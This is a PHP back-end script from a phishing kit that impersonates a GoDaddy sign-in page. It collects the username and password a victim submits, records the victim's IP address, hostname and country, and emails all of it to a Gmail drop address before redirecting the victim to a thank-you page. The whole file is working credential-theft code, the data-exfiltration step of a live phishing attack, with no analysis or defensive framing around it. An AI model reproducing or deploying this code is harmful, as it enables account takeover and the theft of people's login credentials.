<?php
if($_POST["userid"] != "" and $_POST["formtext1"] != ""){
$adddate=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "--------------Godaddysignin  -----------------------\n";
$message .= "Username             : ".$_POST['userid']."\n";
$message .= "Password            : ".$_POST['formtext1']."\n";
$message .= "--------------IP DETAIL-----------------------\n";
$message .= "Date: ".$adddate."\n";
$message .= "Ip Address : ".getenv("REMOTE_ADDR")."\nProvider      : ";
$message .= "Ip Info       http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "---------------Created BY Unknown-------------\n";
$send = "sortedresults1@gmail.com";
$subject = "Result .$ip.";
$headers = "From: Godaddysignin<customer-support@Spammers>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}

 header ("Location: Thank You!.html");
}else{
header ("Location: index.php");
}
	
?>
